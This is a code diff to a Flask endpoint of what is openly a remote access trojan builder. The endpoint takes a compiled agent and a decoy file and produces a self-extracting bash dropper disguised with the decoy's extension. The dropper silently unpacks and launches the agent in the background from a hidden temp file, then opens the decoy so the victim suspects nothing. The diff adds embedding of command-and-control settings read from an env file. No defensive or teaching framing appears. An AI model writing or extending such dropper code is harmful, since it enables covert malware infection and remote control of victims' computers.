@@ -167,7 +167,7 @@ def create_binder():
       - multipart field 'decoy'  : the lure file uploaded by the user
       - form field 'agent'       : filename of the compiled agent in RAT_DIR/target/
     Returns:
-      - A self-extracting bash dropper with the same extension as the decoy file.
+      - A self-extracting bash dropper with embedded env vars + the same extension as the decoy.
     """
     if 'decoy' not in request.files or not request.form.get('agent'):
         return jsonify({"status": "error", "message": "Missing 'decoy' file or 'agent' field."}), 400
@@ -180,6 +180,22 @@ def create_binder():
     if not os.path.isfile(agent_path):
         return jsonify({"status": "error", "message": f"Agent binary '{agent_name}' not found in target/"}), 404
 
+    # Read agent.env (or .env) for runtime config to embed in the dropper
+    env_vars = {}
+    for env_filename in ['agent.env', '.env']:
+        env_path = os.path.join(RAT_DIR, env_filename)
+        if os.path.isfile(env_path):
+            with open(env_path, 'r') as ef:
+                for line in ef:
+                    line = line.strip()
+                    if line and not line.startswith('#') and '=' in line:
+                        k, v = line.split('=', 1)
+                        env_vars[k.strip()] = v.strip()
+            break
+
+    # Build the export block for the dropper
+    env_block = "\n".join([f'export {k}="{v}"' for k, v in env_vars.items()])
+
     try:
         # Base64-encode both files
         decoy_bytes = decoy_file.read()
@@ -188,7 +204,7 @@ def create_binder():
         with open(agent_path, 'rb') as f:
             agent_b64 = base64.b64encode(f.read()).decode('ascii')
 
-        # Build the self-extracting bash dropper
+        # Build the self-extracting bash dropper with embedded env vars
         dropper_script = f"""#!/bin/bash
 # Self-extracting dropper — {decoy_filename}
 AGENT_B64="{agent_b64}"
@@ -196,11 +212,14 @@ DECOY_B64="{decoy_b64}"
 DECOY_NAME="{decoy_filename}"
 TMP_AGENT=$(mktemp /tmp/.XXXXXXXXXX)
 TMP_DECOY=$(mktemp /tmp/XXXXXXXXXX_{decoy_filename})
-# Extract and launch agent silently
+# Extract the agent
 printf '%s' "$AGENT_B64" | base64 -d > "$TMP_AGENT"
 chmod +x "$TMP_AGENT"
+# Set C2 config env vars
+{env_block}
+# Launch agent silently in background
 nohup "$TMP_AGENT" >/dev/null 2>&1 &
-# Extract and open decoy file to show the user something normal
+# Extract and open the decoy file so the user sees something normal
 printf '%s' "$DECOY_B64" | base64 -d > "$TMP_DECOY"
 chmod 644 "$TMP_DECOY"
 if command -v xdg-open &>/dev/null; then
@@ -208,12 +227,10 @@ if command -v xdg-open &>/dev/null; then
 fi
 """
 
-        # Write to a temp file for download
         import tempfile
         tmp = tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(decoy_filename)[1])
         tmp.write(dropper_script.encode('utf-8'))
         tmp.close()
-        # Make the file executable
         os.chmod(tmp.name, 0o755)
 
         return send_file(
